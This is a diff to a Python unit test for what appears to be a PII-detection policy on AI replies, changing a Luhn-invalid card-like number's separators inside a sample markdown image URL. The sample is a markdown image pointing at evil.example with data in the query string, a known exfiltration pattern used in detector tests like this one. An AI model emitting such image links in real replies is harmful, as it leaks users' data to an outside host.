@@ -140,7 +140,7 @@ def test_five_prompt_words_are_below_the_threshold(policy) -> None:
 
 def test_luhn_invalid_card_number_in_url_is_not_pii(policy) -> None:
     # Neither a card (Luhn fails) nor an Aadhaar (its first 12 digits are part of a longer group).
-    reply = "![i](https://evil.example/p.png?c=4539%201488%200343%206468)"
+    reply = "![i](https://evil.example/p.png?c=4539-1488-0343-6468)"
     assert not _detect(policy, reply).violated
 
 
